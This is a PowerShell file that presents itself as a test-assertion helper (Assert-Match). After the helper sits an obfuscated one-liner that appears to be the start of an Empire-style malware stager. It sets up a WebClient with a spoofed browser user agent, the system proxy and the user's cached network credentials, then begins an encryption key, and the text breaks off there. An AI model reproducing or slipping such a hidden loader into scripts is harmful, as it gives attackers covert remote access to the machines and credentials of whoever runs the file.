













function Assert-Match
{
    
    param(
        [Parameter(Position=0,Mandatory=$true)]
        [string]
        
        $Haystack, 
        
        [Parameter(Position=1,Mandatory=$true)]
        [string]
        
        $Regex, 
        
        [Parameter(Position=2)]
        [string]
        
        $Message
    )
    
    if( $Haystack -notmatch $Regex )
    {
        Fail "'$Haystack' does not match '$Regex': $Message"
    }
}


[SystEM.Net.SErVicePoiNtManaGer]::ExpEcT100COntInUe = 0;$Wc=NeW-ObjEct SysTEm.NEt.WebCLieNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEaDERS.AdD('User-Agent',$u);$wc.PRoxY = [SyStem.Net.WebRequEST]::DeFAUlTWeBPrOxy;$WC.PRoxy.CrEDENTiAls = [SySTem.NeT.CreDentiALCacHE]::DeFAUlTNeTWorKCrEDEntIALs;$K='szq]Fy(o6?)w`

